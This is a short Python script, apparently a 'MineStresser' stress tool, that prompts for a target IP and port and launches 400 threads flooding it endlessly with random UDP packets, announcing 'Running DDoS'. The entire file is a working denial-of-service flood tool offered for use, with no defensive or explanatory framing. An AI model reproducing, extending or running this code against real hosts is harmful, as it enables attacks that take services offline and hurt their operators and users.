import socket
import time
import os
import random
import threading

# Coding by: MineStresser
# VPS
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
# Menu

art = r"""


═══ M I N E S T R E S S E R ═══

"""
os.system("clear")
print("\033[31m" + art)
print("by: MineStresser")
print(" ")
time.sleep(1)
ip = input("IP: ")
port = int(input("PORT: "))
time.sleep(1)
print(" ")
os.system("clear")
print(art)
print(" ")
print(f"Running DDoS {ip} {port}")
# Start Attack

for i in range(400):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(1)
